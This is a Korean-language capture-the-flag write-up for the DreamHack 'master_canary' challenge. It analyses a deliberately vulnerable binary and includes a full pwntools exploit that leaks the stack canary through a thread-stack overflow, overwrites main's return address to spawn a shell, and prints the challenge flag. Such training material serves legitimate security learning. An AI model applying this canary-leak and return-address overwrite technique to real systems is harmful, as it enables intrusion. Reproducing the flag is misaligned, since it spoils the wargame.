# [DreamHack] master_canary

:writing_hand: [h0meb0dy](mailto:h0meb0dysj@gmail.com)

> 이 문제는 서버에서 작동하고 있는 서비스(master_canary)의 바이너리와 소스 코드가 주어집니다.
> 카나리 값을 구해 실행 흐름을 조작해 셸을 획득하세요.
> 셸을 획득한 후 얻은 “flag” 파일의 내용을 워게임 사이트에 인증하면 점수를 획득할 수 있습니다.
> 플래그의 형식은 DH{…} 입니다.
>
> Release: [master_canary.zip](https://github.com/h0meb0dy/Dreamhack-Wargame/files/8549898/master_canary.zip)

## Mitigation

![image](https://user-images.githubusercontent.com/102066383/161218706-b74aa62f-143d-414f-b9dd-35bcaf481520.png)

## Analysis

### 1. Create thread

```c
            case 1:
                if (pthread_create(&thread_t, NULL, thread_routine, NULL) < 0)
                {
                    perror("thread create error");
                    exit(0);
                }
                break;
```

쓰레드를 생성하고 `thread_routine()`을 호출한다.

```c
void *thread_routine() {
    char buf[256];

    global_buffer = buf;

}
```

`thread_routine()`에서는 전역 변수 `global_buffer`에 `buf`의 주소, 즉 새로 만들어진 쓰레드의 스택의 주소를 저장한다.

### 2. Input

```c
            case 2:
                printf("Size: ");
                scanf("%d", &size);

                printf("Data: ");
                read_bytes(global_buffer, size);

                printf("Data: %s", global_buffer);
                break;
```

`global_buffer`에 원하는 크기만큼 데이터를 입력할 수 있다. 입력하고 나서는 `global_buffer`에 저장된 데이터를 출력해 주는데, `printf("%s")`로 출력하여 memory leak이 발생할 수 있다.

### 3. Exit

```c
            case 3:
                printf("Leave comment: ");
                read(0, leave_comment, 1024);
                return 0;
```

`leave_comment`는 32바이트 크기의 buffer인데, 1024바이트만큼 입력을 받아서 BOF가 발생한다.

## Exploit

Thread 2의 스택에서 발생하는 BOF를 이용하여 thread 1의 master canary를 leak할 수 있다. Canary 값을 알아낸 후에, `main()`의 return address를 `get_shell()`의 주소로 덮으면 셸을 획득할 수 있다.

```python
from pwn import *

REMOTE = True

if not REMOTE:
    r = process('./release/master_canary')
else:
    r = remote('host1.dreamhack.games', 15807)

sla = r.sendlineafter
sa = r.sendafter

get_shell = 0x400a4a  # get_shell()


# leak canary

sla('> ', '1')

sla('> ', '2')
size = 0x8e9
sla('Size: ', str(size))
sa('Data: ', 'a' * size)

r.recvuntil('a' * size)
canary = u64(r.recvn(7).rjust(8, b'\x00'))


# overwrite return address of main() with get_shell()

payload = b'a' * 0x28 # dummy
payload += p64(canary) # canary
payload += b'a' * 8 # sfp
payload += p64(get_shell)

sla('> ', '3')
sa('Leave comment: ', payload)


r.interactive()
```

```
$ python3 solve.py
[+] Opening connection to host1.dreamhack.games on port 15807: Done
[*] Switching to interactive mode
$ cat flag
DH{7c0bfdbd75bc61acadbe856d6738758b}
```